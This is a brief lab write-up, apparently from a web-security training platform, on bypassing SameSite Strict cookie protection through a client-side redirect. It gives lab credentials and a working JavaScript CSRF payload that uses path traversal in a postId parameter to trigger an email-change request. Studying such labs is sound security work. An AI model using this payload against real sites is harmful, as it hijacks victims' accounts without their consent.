Lab #10 - SameSite Strict bypass via client-side redirect

Goal - Exploit CSRF to change the victim's email address.

Creds - wiener:peter

Analysis:

<script>
   document.location="https://0aaf00af03e122ac81887f1000cf00ba.web-security-academy.net/post/comment/confirmation?postId=../../my-account/change-email?email=test2%40test.ca%26submit=1";
</script>